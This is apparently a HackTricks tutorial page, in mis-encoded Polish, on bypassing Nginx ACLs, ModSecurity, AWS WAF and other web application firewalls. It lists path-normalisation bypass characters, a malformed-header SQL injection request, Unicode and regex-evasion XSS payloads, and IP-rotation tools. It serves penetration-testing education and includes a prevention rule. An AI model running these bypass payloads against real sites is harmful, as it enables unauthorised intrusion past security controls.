# Proxy / WAF Protections Bypass

{% hint style="success" %}
Ucz siÄ™ i Ä‡wicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz siÄ™ i Ä‡wicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* SprawdÅº [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ trikami hackingowymi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w na githubie.

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## OminiÄ™cie reguÅ‚ ACL Nginx za pomocÄ… manipulacji Å›cieÅ¼kÄ… <a href="#heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules" id="heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules"></a>

Techniki [z tych badaÅ„](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies).

PrzykÅ‚ad reguÅ‚y Nginx:
```plaintext
location = /admin {
deny all;
}

location = /admin/ {
deny all;
}
```
Aby zapobiec obejÅ›ciom, Nginx wykonuje normalizacjÄ™ Å›cieÅ¼ek przed jej sprawdzeniem. Jednak jeÅ›li serwer zaplecza wykonuje innÄ… normalizacjÄ™ (usuwajÄ…c znaki, ktÃ³rych Nginx nie usuwa), moÅ¼e byÄ‡ moÅ¼liwe obejÅ›cie tej obrony.

### **NodeJS - Express**

| Wersja Nginx | **Znaki do obejÅ›cia Node.js** |
| ------------- | ------------------------------- |
| 1.22.0        | `\xA0`                          |
| 1.21.6        | `\xA0`                          |
| 1.20.2        | `\xA0`, `\x09`, `\x0C`          |
| 1.18.0        | `\xA0`, `\x09`, `\x0C`          |
| 1.16.1        | `\xA0`, `\x09`, `\x0C`          |

### **Flask**

| Wersja Nginx | **Znaki do obejÅ›cia Flask**                                      |
| ------------- | --------------------------------------------------------------- |
| 1.22.0        | `\x85`, `\xA0`                                                 |
| 1.21.6        | `\x85`, `\xA0`                                                 |
| 1.20.2        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |
| 1.18.0        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |
| 1.16.1        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |

### **Spring Boot**

| Wersja Nginx | **Znaki do obejÅ›cia Spring Boot** |
| ------------- | --------------------------------- |
| 1.22.0        | `;`                               |
| 1.21.6        | `;`                               |
| 1.20.2        | `\x09`, `;`                       |
| 1.18.0        | `\x09`, `;`                       |
| 1.16.1        | `\x09`, `;`                       |

### **PHP-FPM**

Konfiguracja Nginx FPM:
```plaintext
location = /admin.php {
deny all;
}

location ~ \.php$ {
include snippets/fastcgi-php.conf;
fastcgi_pass unix:/run/php/php8.1-fpm.sock;
}
```
Nginx jest skonfigurowany, aby blokowaÄ‡ dostÄ™p do `/admin.php`, ale moÅ¼na to obejÅ›Ä‡, uzyskujÄ…c dostÄ™p do `/admin.php/index.php`.

### Jak zapobiec
```plaintext
location ~* ^/admin {
deny all;
}
```
## Bypass Mod Security Rules <a href="#heading-bypassing-aws-waf-acl" id="heading-bypassing-aws-waf-acl"></a>

### Path Confusion

[**W tym poÅ›cie**](https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/) wyjaÅ›niono, Å¼e ModSecurity v3 (do 3.0.12) **nieprawidÅ‚owo zaimplementowaÅ‚ zmiennÄ… `REQUEST_FILENAME`**, ktÃ³ra miaÅ‚a zawieraÄ‡ dostÄ™pny path (do poczÄ…tku parametrÃ³w). Dzieje siÄ™ tak, poniewaÅ¼ wykonano dekodowanie URL, aby uzyskaÄ‡ path.\
Dlatego Å¼Ä…danie takie jak `http://example.com/foo%3f';alert(1);foo=` w mod security bÄ™dzie zakÅ‚adaÄ‡, Å¼e path to tylko `/foo`, poniewaÅ¼ `%3f` jest przeksztaÅ‚cane w `?`, koÅ„czÄ…c path URL, ale w rzeczywistoÅ›ci path, ktÃ³ry otrzyma serwer, bÄ™dzie `/foo%3f';alert(1);foo=`.

Zmienne `REQUEST_BASENAME` i `PATH_INFO` rÃ³wnieÅ¼ byÅ‚y dotkniÄ™te tym bÅ‚Ä™dem.

CoÅ› podobnego miaÅ‚o miejsce w wersji 2 Mod Security, ktÃ³ra pozwalaÅ‚a na obejÅ›cie ochrony, ktÃ³ra uniemoÅ¼liwiaÅ‚a uÅ¼ytkownikom dostÄ™p do plikÃ³w z okreÅ›lonymi rozszerzeniami zwiÄ…zanymi z plikami kopii zapasowej (takimi jak `.bak`), po prostu wysyÅ‚ajÄ…c kropkÄ™ zakodowanÄ… w URL jako `%2e`, na przykÅ‚ad: `https://example.com/backup%2ebak`.

## Bypass AWS WAF ACL <a href="#heading-bypassing-aws-waf-acl" id="heading-bypassing-aws-waf-acl"></a>

### Malformed Header

[To badanie](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies) wspomina, Å¼e moÅ¼liwe byÅ‚o obejÅ›cie reguÅ‚ AWS WAF stosowanych do nagÅ‚Ã³wkÃ³w HTTP, wysyÅ‚ajÄ…c "nieprawidÅ‚owy" nagÅ‚Ã³wek, ktÃ³ry nie byÅ‚ prawidÅ‚owo analizowany przez AWS, ale byÅ‚ przez serwer zaplecza.

Na przykÅ‚ad, wysyÅ‚ajÄ…c nastÄ™pujÄ…ce Å¼Ä…danie z SQL injection w nagÅ‚Ã³wku X-Query:
```http
GET / HTTP/1.1\r\n
Host: target.com\r\n
X-Query: Value\r\n
\t' or '1'='1' -- \r\n
Connection: close\r\n
\r\n
```
MoÅ¼liwe byÅ‚o ominiÄ™cie AWS WAF, poniewaÅ¼ nie rozumiaÅ‚, Å¼e nastÄ™pna linia jest czÄ™Å›ciÄ… wartoÅ›ci nagÅ‚Ã³wka, podczas gdy serwer NODEJS to rozumiaÅ‚ (to zostaÅ‚o naprawione).

## OgÃ³lne omijanie WAF

### Limity rozmiaru Å¼Ä…dania

Zwykle WAF-y majÄ… okreÅ›lony limit dÅ‚ugoÅ›ci Å¼Ä…daÅ„ do sprawdzenia, a jeÅ›li Å¼Ä…danie POST/PUT/PATCH jest wiÄ™ksze, WAF nie sprawdzi Å¼Ä…dania.

* Dla AWS WAF, moÅ¼esz [**sprawdziÄ‡ dokumentacjÄ™**](https://docs.aws.amazon.com/waf/latest/developerguide/limits.html)**:**

<table data-header-hidden><thead><tr><th width="687"></th><th></th></tr></thead><tbody><tr><td>Maksymalny rozmiar ciaÅ‚a Å¼Ä…dania sieciowego, ktÃ³re moÅ¼e byÄ‡ sprawdzane dla ochrony Application Load Balancer i AWS AppSync</td><td>8 KB</td></tr><tr><td>Maksymalny rozmiar ciaÅ‚a Å¼Ä…dania sieciowego, ktÃ³re moÅ¼e byÄ‡ sprawdzane dla ochrony CloudFront, API Gateway, Amazon Cognito, App Runner i Verified Access**</td><td>64 KB</td></tr></tbody></table>

* Z [**dokumentacji Azure**](https://learn.microsoft.com/en-us/azure/web-application-firewall/ag/application-gateway-waf-request-size-limits)**:**

Starsze zapory aplikacji internetowych z Core Rule Set 3.1 (lub niÅ¼szym) pozwalajÄ… na wiadomoÅ›ci wiÄ™ksze niÅ¼ **128 KB** poprzez wyÅ‚Ä…czenie inspekcji ciaÅ‚a Å¼Ä…dania, ale te wiadomoÅ›ci nie bÄ™dÄ… sprawdzane pod kÄ…tem podatnoÅ›ci. W nowszych wersjach (Core Rule Set 3.2 lub nowszych) to samo moÅ¼na zrobiÄ‡, wyÅ‚Ä…czajÄ…c maksymalny limit ciaÅ‚a Å¼Ä…dania. Gdy Å¼Ä…danie przekracza limit rozmiaru:

JeÅ›li **tryb zapobiegania**: Rejestruje i blokuje Å¼Ä…danie.\
JeÅ›li **tryb wykrywania**: Sprawdza do limitu, ignoruje resztÄ™ i rejestruje, jeÅ›li `Content-Length` przekracza limit.

* Z [**Akamai**](https://community.akamai.com/customers/s/article/Can-WAF-inspect-all-arguments-and-values-in-request-body?language=en_US)**:**

DomyÅ›lnie WAF sprawdza tylko pierwsze 8KB Å¼Ä…dania. MoÅ¼e zwiÄ™kszyÄ‡ limit do 128KB, dodajÄ…c zaawansowane metadane.

* Z [**Cloudflare**](https://developers.cloudflare.com/ruleset-engine/rules-language/fields/#http-request-body-fields)**:**

Do 128KB.

### Obfuskacja <a href="#obfuscation" id="obfuscation"></a>
```bash
# IIS, ASP Clasic
<%s%cr%u0131pt> == <script>

# Path blacklist bypass - Tomcat
/path1/path2/ == ;/path1;foo/path2;bar/;
```
### Unicode Compatability <a href="#unicode-compatability" id="unicode-compatability"></a>

W zaleÅ¼noÅ›ci od implementacji normalizacji Unicode (wiÄ™cej informacji [tutaj](https://jlajara.gitlab.io/Bypass\_WAF\_Unicode)), znaki, ktÃ³re majÄ… zgodnoÅ›Ä‡ z Unicode, mogÄ… byÄ‡ w stanie obejÅ›Ä‡ WAF i wykonaÄ‡ zamierzony Å‚adunek. Zgodne znaki moÅ¼na znaleÅºÄ‡ [tutaj](https://www.compart.com/en/unicode).

#### Example <a href="#example" id="example"></a>
```bash
# under the NFKD normalization algorithm, the characters on the left translate
# to the XSS payload on the right
ï¼œimg srcâ¼p onerrorâ¼ï¼‡promptâ½1â¾ï¼‡ï¹¥  --> ï¼œimg src=p onerror='prompt(1)'>
```
### H2C Smuggling <a href="#ip-rotation" id="ip-rotation"></a>

{% content-ref url="h2c-smuggling.md" %}
[h2c-smuggling.md](h2c-smuggling.md)
{% endcontent-ref %}

### IP Rotation <a href="#ip-rotation" id="ip-rotation"></a>

* [https://github.com/ustayready/fireprox](https://github.com/ustayready/fireprox): Generuj URL bramy API do uÅ¼ycia z ffuf
* [https://github.com/rootcathacking/catspin](https://github.com/rootcathacking/catspin): Podobne do fireprox
* [https://github.com/PortSwigger/ip-rotate](https://github.com/PortSwigger/ip-rotate): Wtyczka Burp Suite, ktÃ³ra uÅ¼ywa IP bramy API
* [https://github.com/fyoorer/ShadowClone](https://github.com/fyoorer/ShadowClone): Dynamically determined number of container instances are activated based on the input file size and split factor, with the input split into chunks for parallel execution, such as 100 instances processing 100 chunks from a 10,000-line input file with a split factor of 100 lines.

### Regex Bypasses

RÃ³Å¼ne techniki mogÄ… byÄ‡ uÅ¼ywane do omijania filtrÃ³w regex na zaporach. PrzykÅ‚ady obejmujÄ… naprzemiennÄ… wielkoÅ›Ä‡ liter, dodawanie Å‚amaÅ„ linii i kodowanie Å‚adunkÃ³w. Zasoby dotyczÄ…ce rÃ³Å¼nych obejÅ›Ä‡ moÅ¼na znaleÅºÄ‡ na [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#filter-bypass-and-exotic-payloads) oraz [OWASP](https://cheatsheetseries.owasp.org/cheatsheets/XSS\_Filter\_Evasion\_Cheat\_Sheet.html). PrzykÅ‚ady poniÅ¼ej zostaÅ‚y zaczerpniÄ™te z [tego artykuÅ‚u](https://medium.com/@allypetitt/5-ways-i-bypassed-your-web-application-firewall-waf-43852a43a1c2).
```bash
<sCrIpT>alert(XSS)</sCriPt> #changing the case of the tag
<<script>alert(XSS)</script> #prepending an additional "<"
<script>alert(XSS) // #removing the closing tag
<script>alert`XSS`</script> #using backticks instead of parenetheses
java%0ascript:alert(1) #using encoded newline characters
<iframe src=http://malicous.com < #double open angle brackets
<STYLE>.classname{background-image:url("javascript:alert(XSS)");}</STYLE> #uncommon tags
<img/src=1/onerror=alert(0)> #bypass space filter by using / where a space is expected
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=javascript:alert(1)>xss</a> #extra characters
Function("ale"+"rt(1)")(); #using uncommon functions besides alert, console.log, and prompt
javascript:74163166147401571561541571411447514115414516216450615176 #octal encoding
<iframe src="javascript:alert(`xss`)"> #unicode encoding
/?id=1+un/**/ion+sel/**/ect+1,2,3-- #using comments in SQL query to break up statement
new Function`alt\`6\``; #using backticks instead of parentheses
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+ #base64 encoding the javascript
%26%2397;lert(1) #using HTML encoding
<a src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(XSS)"> #Using Line Feed (LF) line breaks
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=confirm()> # use any chars that aren't letters, numbers, or encapsulation chars between event handler and equal sign (only works on Gecko engine)
```
## NarzÄ™dzia

* [**nowafpls**](https://github.com/assetnote/nowafpls): Wtyczka Burp do dodawania niepotrzebnych danych do Å¼Ä…daÅ„ w celu obejÅ›cia WAF-Ã³w przez dÅ‚ugoÅ›Ä‡

## Odniesienia

* [https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)
* [https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/](https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/)
* [https://www.youtube.com/watch?v=0OMmWtU2Y\_g](https://www.youtube.com/watch?v=0OMmWtU2Y\_g)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
Ucz siÄ™ i Ä‡wicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz siÄ™ i Ä‡wicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* SprawdÅº [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel siÄ™ sztuczkami hackingowymi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w na githubie.

</details>
{% endhint %}
